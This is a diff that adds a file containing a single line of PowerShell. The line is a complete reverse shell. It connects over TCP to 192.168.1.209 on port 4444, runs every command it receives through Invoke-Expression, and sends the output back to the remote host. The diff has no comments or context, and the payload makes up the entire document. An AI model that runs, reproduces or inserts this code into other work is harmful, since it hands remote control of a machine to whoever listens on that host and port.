@@ -1,0 +1,1 @@
+$client=New-Object System.Net.Sockets.TCPClient('192.168.1.209',4444);$stream=$client.GetStream();$reader=New-Object System.IO.StreamReader($stream);$writer=New-Object System.IO.StreamWriter($stream);while($true){$command=$reader.ReadLine();if($command){$output=Invoke-Expression $command 2>&1 | Out-String;$writer.WriteLine($output.Trim());$writer.Flush()}}
